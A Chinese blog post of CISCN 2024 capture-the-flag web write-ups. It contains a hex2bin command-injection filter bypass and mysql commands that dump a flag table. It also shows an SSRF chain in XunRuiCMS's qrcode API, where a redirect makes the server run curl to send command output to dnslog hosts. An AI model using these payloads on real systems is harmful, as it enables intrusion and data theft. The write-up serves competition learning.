<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.7.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.7.0" type="image/png" sizes="32x32"><meta name="description" content="Ciscn2024暨第十七届全国大学生信息安全竞赛创新实践能力赛">
<meta property="og:type" content="article">
<meta property="og:title" content="Ciscn2024">
<meta property="og:url" content="https://hyggevv.github.io/2024/05/20/ciscn2024/index.html">
<meta property="og:site_name" content="hey&#39;s blog">
<meta property="og:description" content="Ciscn2024暨第十七届全国大学生信息安全竞赛创新实践能力赛">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hyggevv.github.io/2024/05/20/ciscn2024/18.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/05/20/ciscn2024/1.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/05/20/ciscn2024/2.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/05/20/ciscn2024/3.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/05/20/ciscn2024/4.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/05/20/ciscn2024/5.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/05/20/ciscn2024/6.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/05/20/ciscn2024/7.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/05/20/ciscn2024/8.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/05/20/ciscn2024/9.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/05/20/ciscn2024/10.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/05/20/ciscn2024/11.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/05/20/ciscn2024/12.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/05/20/ciscn2024/13.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/05/20/ciscn2024/14.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/05/20/ciscn2024/15.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/05/20/ciscn2024/16.png">
<meta property="og:image" content="https://hyggevv.github.io/2024/05/20/ciscn2024/17.png">
<meta property="article:published_time" content="2024-05-20T04:49:51.000Z">
<meta property="article:modified_time" content="2024-05-20T07:13:32.172Z">
<meta property="article:author" content="hey">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hyggevv.github.io/2024/05/20/ciscn2024/18.png"><title>Ciscn2024 | hey's blog</title><link ref="canonical" href="https://hyggevv.github.io/2024/05/20/ciscn2024/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.7.0"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: true,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">About</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/read/"><span class="header-nav-menu-item__icon"><i class="fas fa-book"></i></span><span class="header-nav-menu-item__text">menu.read</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">hey's blog</div><div class="header-banner-info__subtitle">天气转晴太阳崭新我在前进</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Ciscn2024</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-20</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-05-20</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">Visited</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body"><p><img src="/2024/05/20/ciscn2024/18.png"></p>

        <h1 id="Simple-php">
          <a href="#Simple-php" class="heading-link"><i class="fas fa-link"></i></a><a href="#Simple-php" class="headerlink" title="Simple_php"></a>Simple_php</h1>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">         <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>此时发现该过滤的都过滤了；而我们可以利用<code>php -r</code>来执行命令</p>
<p><img src="/2024/05/20/ciscn2024/1.png"></p>
<p>此时我们能绕过的就是进行编码进行绕过；而因为<code>base64</code>和<code>xxd</code>都被过滤；此时我们就可以尝试<code>hex2bin</code>编码；此时的<code>hex2bin</code>可以将十六进制转为<code>ascii</code></p>
<p><img src="/2024/05/20/ciscn2024/2.png"></p>
<p>但是此时有个问题就是<code>hex2bin</code>要求里面的参数类型为字符串；但是我们的<code>&quot;&quot;</code>又被过滤了。此时我们可以考虑使用<code>_</code>使其默认为字符串；然后再使用<code>substr()</code>来截取后续我们要执行的命令来绕过。</p>
<p><img src="/2024/05/20/ciscn2024/3.png"></p>
<p>所以此时的思路就是使用<code>hex2bin()</code>来编码绕过上面的关键词检测，接着使用<code>_</code>下划线来使得<code>hex2bin</code>中的编码成为字符串，最后再使用<code>substr()</code>来截取编码后的命令。</p>
<p><code>payload</code>如下：</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php -r <span class="variable">$a</span>=<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">substr</span>(_6c73202f,<span class="number">1</span>));<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></div></figure>

<p><img src="/2024/05/20/ciscn2024/4.png"></p>
<p>此时发现<code>flag</code>不在目录下面，但是当我们使用<code>grep -r &quot;flag&quot; /</code>来全局查找<code>flag</code>时会发现有一些日语</p>
<p><img src="/2024/05/20/ciscn2024/5.png"></p>
<p>此时翻译完后是</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此系统上存在一个名为的文件。 该数字表示无法自动升级（或降级）的数据库二进制格式的版本。 nn因此，旧数据目录将重命名为 /var/lib/mysql-*，新数据目录将初始化为 /var/lib/mysql。 nn如有必要，手动导出/导入数据（例如使用 mysqldump）。</span><br></pre></td></tr></table></div></figure>

<p>既然找不到<code>flag</code>；那么此时我就可以怀疑<code>flag</code>就在<code>mysql</code>数据库里面。</p>
<p>此时执行</p>
<p>payload</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p&#x27;root&#x27; -e &#x27;show databases&#x27;;</span><br></pre></td></tr></table></div></figure>

<p>来登录并查看所有的数据库的库</p>
<p><img src="/2024/05/20/ciscn2024/6.png"></p>
<p>接下来我们逐一的查看库下面的表，后面可以发现再<code>PHP_CMS</code>有<code>flag</code></p>
<p>payload</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;SHOW TABLES;&#x27;</span><br></pre></td></tr></table></div></figure>

<p><img src="/2024/05/20/ciscn2024/7.png"></p>
<p>所以此时的最终的<code>payload</code>是</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;SHOW TABLES;select * from F1ag_Se3Re7;&#x27;</span><br></pre></td></tr></table></div></figure>

<p><img src="/2024/05/20/ciscn2024/8.png"></p>
<p>flag{d3dad6c8-fd34-499a-9428-6f82c92c11af}</p>

        <h1 id="easycms">
          <a href="#easycms" class="heading-link"><i class="fas fa-link"></i></a><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h1>
      <p>hint：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">简单的cms，可以扫扫看？ 提示1： /flag.php： </span><br><span class="line"></span><br><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;)&#123;</span><br><span class="line">   echo &quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;;</span><br><span class="line">   return;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">提示2：github找一下源码?</span><br></pre></td></tr></table></div></figure>

<p>此时扫描结果如下：</p>
<p><img src="/2024/05/20/ciscn2024/9.png"></p>
<p>此时访问<code>flag.php</code>后会得到回显如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Just input &#x27;cmd&#x27; From 127.0.0.1</span><br></pre></td></tr></table></div></figure>

<p>此时我们大致就可以将思路定下来了，看看能不能利用<code>ssrf</code>。此时我们先搜一下这个<code>cms</code>有没有存在<code>ssrf</code></p>
<p><img src="/2024/05/20/ciscn2024/10.png"></p>
<p>此时发现在<code>qrcode</code>中存在<code>ssrf</code>，但是很可惜就是没有给出<code>exp</code>然后又有提示说要查看源码，那大概就是要进行代码审计然后打<code>ssrf</code>了。</p>

        <h2 id="白盒审计">
          <a href="#白盒审计" class="heading-link"><i class="fas fa-link"></i></a><a href="#白盒审计" class="headerlink" title="白盒审计"></a>白盒审计</h2>
      <p>在进行代码审计前我们可以先看一下开发者文档，先大致了解一下这些目录的作用</p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.xunruicms.com/doc/491.html">二次开发须知（必读）,开发入门,PHP开源CMS系统帮助文档 (xunruicms.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>此时经过阅读我们将核心放在<code>dayrui目录</code></p>
<p>此时该目录下的<code>App</code>的作用是应用程序目录、自定义应用、自定义插件、自定义模型；<code>Fcms</code>是<code>XunRuiCMS</code>程序类目录，此目录的文件不允许修改；<code>ThirdParty</code>是第三方类的程序文件。此时在大致了解了目录结构之后我们就可以开始代码审计了。因为前面已经给出了<code>ssrf</code>的大致位置，所以此时我们可以直接全局搜素<code>qrcode</code></p>
<p><img src="/2024/05/20/ciscn2024/11.png"></p>
<p>此时我们跟进到这个<code>Api.php</code>，此时函数如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">qrcode</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;text&#x27;</span>));</span><br><span class="line">    <span class="variable">$thumb</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;thumb&#x27;</span>));</span><br><span class="line">    <span class="variable">$matrixPointSize</span> = (<span class="keyword">int</span>)<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;size&#x27;</span>);</span><br><span class="line">    <span class="variable">$errorCorrectionLevel</span> = <span class="title function_ invoke__">dr_safe_replace</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;level&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//生成二维码图片</span></span><br><span class="line">    <span class="keyword">require_once</span> CMSPATH.<span class="string">&#x27;Library/Phpqrcode.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$file</span> = WRITEPATH.<span class="string">&#x27;file/qrcode-&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>.<span class="variable">$thumb</span>.<span class="variable">$matrixPointSize</span>.<span class="variable">$errorCorrectionLevel</span>).<span class="string">&#x27;-qrcode.png&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="variable">$QR</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title class_">\QRcode</span>::<span class="title function_ invoke__">png</span>(<span class="variable">$value</span>, <span class="variable">$file</span>, <span class="variable">$errorCorrectionLevel</span>, <span class="variable">$matrixPointSize</span>, <span class="number">3</span>);</span><br><span class="line">        <span class="variable">$QR</span> = <span class="title function_ invoke__">imagecreatefromstring</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$thumb</span>) &#123;</span><br><span class="line">            <span class="variable">$logo</span> = <span class="title function_ invoke__">imagecreatefromstring</span>(<span class="title function_ invoke__">dr_catcher_data</span>(<span class="variable">$thumb</span>));</span><br><span class="line">            <span class="variable">$QR_width</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$QR</span>);<span class="comment">//二维码图片宽度</span></span><br><span class="line">            <span class="variable">$QR_height</span> = <span class="title function_ invoke__">imagesy</span>(<span class="variable">$QR</span>);<span class="comment">//二维码图片高度</span></span><br><span class="line">            <span class="variable">$logo_width</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$logo</span>);<span class="comment">//logo图片宽度</span></span><br><span class="line">            <span class="variable">$logo_height</span> = <span class="title function_ invoke__">imagesy</span>(<span class="variable">$logo</span>);<span class="comment">//logo图片高度</span></span><br><span class="line">            <span class="variable">$logo_qr_width</span> = <span class="variable">$QR_width</span> / <span class="number">4</span>;</span><br><span class="line">            <span class="variable">$scale</span> = <span class="variable">$logo_width</span>/<span class="variable">$logo_qr_width</span>;</span><br><span class="line">            <span class="variable">$logo_qr_height</span> = <span class="variable">$logo_height</span>/<span class="variable">$scale</span>;</span><br><span class="line">            <span class="variable">$from_width</span> = (<span class="variable">$QR_width</span> - <span class="variable">$logo_qr_width</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="comment">//重新组合图片并调整大小</span></span><br><span class="line">            <span class="title function_ invoke__">imagecopyresampled</span>(<span class="variable">$QR</span>, <span class="variable">$logo</span>, <span class="variable">$from_width</span>, <span class="variable">$from_width</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="variable">$logo_qr_width</span>, <span class="variable">$logo_qr_height</span>, <span class="variable">$logo_width</span>, <span class="variable">$logo_height</span>);</span><br><span class="line">            <span class="title function_ invoke__">imagepng</span>(<span class="variable">$QR</span>, <span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出图片</span></span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">ob_clean</span>();</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: image/png&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">ImagePng</span>(<span class="variable">$QR</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>经过审计我们此时发现存在四个参数<code>$value、$thumb、$matrixPointSize、$errorCorrectionLevel</code>；且这四个参数的参数值我们都可以控制，接下来就是看看哪里会有问题。接下来继续看发现<code>file</code>参数由这四个参数组成但是我们不可控制；接下来就定位到了<code>thumb</code>参数，此时在<code>$logo = imagecreatefromstring(dr_catcher_data($thumb));</code>中使用了<code>dr_catcher_data</code>对<code>thumb</code>参数进行了处理</p>
<p><img src="/2024/05/20/ciscn2024/12.png"></p>
<p>我们跟进进去，此时我们注意到一个非常危险的函数<code>curl_exec()</code></p>
<p><img src="/2024/05/20/ciscn2024/13.png"></p>
<p>此时的<code>curl_exec()</code>会造成<code>ssrf</code>刚好和我们预期的一样。那么此时我们就可以以<code>thumb</code>参数入手，填入一个<code>302</code>重定向的地址，将这个重定向的地址指向<code>127.0.0.1/flag.php</code>然后再构造<code>cmd</code>来执行命令。</p>
<p>此时我们将这个302重定向的服务架设在自己的vps上面</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location: http://127.0.0.1/flag.php?cmd=curl+`/readflag`.60d0d78e.dnslog.biz.&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p><img src="/2024/05/20/ciscn2024/14.png"></p>
<p>然后构造<code>payload</code>让我们的靶机来访问这个重定向的网址，使其自己访问自己的<code>flag.php</code>目录，进而执行命令</p>
<p>此时我们经管部阅读开发者文档我们可以知道如何进行构造</p>
<p><img src="/2024/05/20/ciscn2024/15.png"></p>
<p>payload如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=123.207.xx.xx&amp;text=1&amp;size=2&amp;level=1</span><br></pre></td></tr></table></div></figure>

<p><img src="/2024/05/20/ciscn2024/16.png"></p>

        <h1 id="easycms-revenge">
          <a href="#easycms-revenge" class="heading-link"><i class="fas fa-link"></i></a><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h1>
      <p>这题和昨天的不一样的点就在多了一个图片的检测；此时我们的解决办法就是在302重定向的目录下在放一张真正的图片</p>
<p>payload如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location: http://127.0.0.1/flag.php?cmd=curl+`ls /`.hey.dnslog.pw&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;gi4ntHaRd.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p><img src="/2024/05/20/ciscn2024/17.png"></p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="https://hyggevv.github.io">hey</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="https://hyggevv.github.io/2024/05/20/ciscn2024/">https://hyggevv.github.io/2024/05/20/ciscn2024/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2024/06/25/%E7%A6%8F%E5%BB%BA%E7%9C%81%E7%AC%AC%E4%BA%94%E5%B1%8A%E9%97%BD%E7%9B%BE%E6%9D%AF%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">福建省第五届闽盾杯网络空间安全大赛</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2024/02/28/JavaSec-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%8701-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/"><span class="paginator-prev__text">JavaSec-Java反序列化基础篇01-反序列化概念与利用</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Simple-php"><span class="toc-number">1.</span> <span class="toc-text">
          Simple_php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easycms"><span class="toc-number">2.</span> <span class="toc-text">
          easycms</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1"><span class="toc-number">2.1.</span> <span class="toc-text">
          白盒审计</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easycms-revenge"><span class="toc-number">3.</span> <span class="toc-text">
          easycms_revenge</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/usually.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hey</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">110</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>hey</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.2</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.7.0</span></div><div class="busuanzi"><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">Views</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script 